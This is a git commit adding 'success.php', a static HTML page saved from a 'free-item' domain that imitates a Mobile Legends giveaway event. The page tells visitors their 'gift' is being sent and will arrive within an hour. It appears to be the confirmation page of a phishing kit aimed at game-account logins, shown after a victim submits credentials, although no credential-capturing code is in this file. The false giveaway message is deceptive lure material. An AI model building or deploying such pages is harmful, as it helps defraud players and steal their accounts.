51b00e4c1dbf502ac1efe0929c729438bb507e05
Nathan S. Lombard <77010376+albittons@users.noreply.github.com>
2021-01-11 20:23:36 +0200

    Add files via upload

---
+++ success.php
@@ -0,0 +1,67 @@
+<!DOCTYPE html>
+<!-- saved from url=(0047)http://mobilelegends.free-item2l.gq/success.php -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link rel="stylesheet" href="./number5/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+        <link rel="stylesheet" href="./number5/material-design-iconic-font.css">
+        <link rel="stylesheet" href="./number5/style.css">
+        <title>Event Mobile Legends</title>
+        <link rel="shorcut icon" href="./number5/unnamed.png">
+    </head>
+    <body>
+        <div class="mobile">
+            <div class="navbar">
+                <img src="./number5/unnamed.png">
+                <div class="text-left text-white text-header">
+                    MOBILE LEGENDS<br>
+                    <span>Success</span>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-12 col-12">
+                    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
+                        <ol class="carousel-indicators">
+                            <li data-target="#carouselExampleIndicators" data-slide-to="0" class=""></li>
+                            <li data-target="#carouselExampleIndicators" data-slide-to="1" class=""></li>
+                            <li data-target="#carouselExampleIndicators" data-slide-to="2" class="active"></li>
+                        </ol>
+                        <div class="carousel-inner">
+                            <div class="carousel-item">
+                                <img src="./number5/Cq2Ixl-OjKCATP4aAADwCAm4WeI149.jpg" class="d-block w-100" alt="...">
+                            </div>
+                            <div class="carousel-item">
+                                <img src="./number5/Cq2Ixl-M-QGAU-4DAAEOwZRbJIc820.jpg" class="d-block w-100" alt="...">
+                            </div>
+                            <div class="carousel-item active">
+                                <img src="./number5/Cq2Ixl-L9rWAVb6MAADVs4soSgE418.jpg" class="d-block w-100" alt="...">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row mt-1 mb-1">
+                <div class="col-md-12 col-12">
+                    <div class="clearfix"></div>
+                </div>
+            </div>
+
+            <div class="row mt-4 d-block mx-auto">
+                <div class="col-md-12 col-12 mb-4 text-white text-center" style="font-size: 0.8em;">
+                    Congratulations. Your gift is in the process of being sent. Claims in an hour, Thank you.
+                </div>
+                <div class="col-md-12 col-12">
+                    <button class="btn btn-primary text-left" onclick="location.href=&#39;./&#39;"> <i class="zmdi zmdi-shield-check" style="font-size: 2.9em;"></i> <div class="txtLogin2">Logout</div></button>
+                </div>
+            </div>
+
+            <div class="mb-3"></div>
+        </div>
+
+        <script src="./number5/jquery.min.js"></script>
+        <script src="./number5/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+        <script src="./number5/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+        <script src="./number5/index.js"></script>
+    
+</body></html>
